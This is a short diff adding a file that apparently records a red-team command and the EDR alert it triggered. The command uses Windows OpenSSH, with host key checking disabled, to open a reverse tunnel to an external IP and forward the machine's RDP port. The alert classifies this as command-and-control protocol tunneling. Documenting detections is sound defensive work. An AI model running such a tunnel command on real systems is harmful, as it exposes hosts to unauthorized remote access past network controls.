@@ -1,0 +1,8 @@
+Red Team Command:
+"C:\Windows\System32\OpenSSH\ssh.exe" -o StrictHostKeyChecking=no -i spf tmpuser@54.123.123.12 -R 23389:127.0.0.1:3389 -N
+
+EDR alert:
+Reverse SSH tunnel from ec2-host.amazonaws.com might have been created using the command "C:\Windows\System32\OpenSSH\ssh.exe" -o StrictHostKeyChecking=no -i spf tmpuser@54.123.123.12 -R 23389:127.0.0.1:3389 -N "
+Category: Command and Control
+Technique: Protocol Tunneling
+Description: Reverse SSH tunnel to external domain/ip: A reverse SSH tunnel might have been created
